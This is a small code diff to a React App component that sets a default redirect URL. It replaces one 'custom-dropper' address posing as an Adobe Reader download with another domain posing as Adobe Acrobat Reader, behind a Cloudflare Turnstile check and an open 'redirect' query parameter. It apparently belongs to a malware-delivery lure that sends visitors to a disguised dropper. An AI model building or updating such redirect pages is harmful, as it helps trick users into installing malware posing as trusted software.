@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://custom-dropper-dashb-4uwr.bolt.host/#/d/adobe-reader-69nuii';
+    const redirectUrl = params.get('redirect') || 'https://propitproject.net/#/d/adobe-acrobat-reader-jb215t';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
